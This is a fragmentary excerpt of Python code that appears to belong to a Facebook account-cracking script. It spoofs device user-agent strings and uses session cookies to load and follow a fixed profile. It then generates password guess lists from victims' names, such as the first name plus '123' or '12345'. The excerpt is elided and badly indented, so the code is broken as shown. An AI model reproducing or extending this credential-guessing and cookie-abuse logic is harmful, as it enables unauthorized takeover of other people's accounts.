...
for i in range(int(10000)):
		...
		bbb = random.choice(
			[
				'1','1.0','1.5','2','2.0','2.5','3','3.0','3.5',
                '4','4.0','4.5','5','5.0','5.5','6','6.0','6.5',
                '7','7.0','7.5','8','8.0','8.5','9','9.0','9.5',
                '10','10.0','10.5','11','11.0','11.5','12','12.0',
                '12.5','13'
			]
		)
		ccc = 'en-us; GT-'
...
class ACL:
    ...
    def ikuti(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100029285173905", cookies=cok).text, "html.parser")
                ...
                try:
                    if len(nama) <=5:
                        if len(depan) <=1 or len(depan) <=2:pass
                            ...
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345", depan[0]+"1234", depan[0]+"123456"]
                    else:
                        pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345", depan[0]+"1234", depan[0]+"123456"]
                    if "iya" in self.iya:
                        for x in self.pasw:
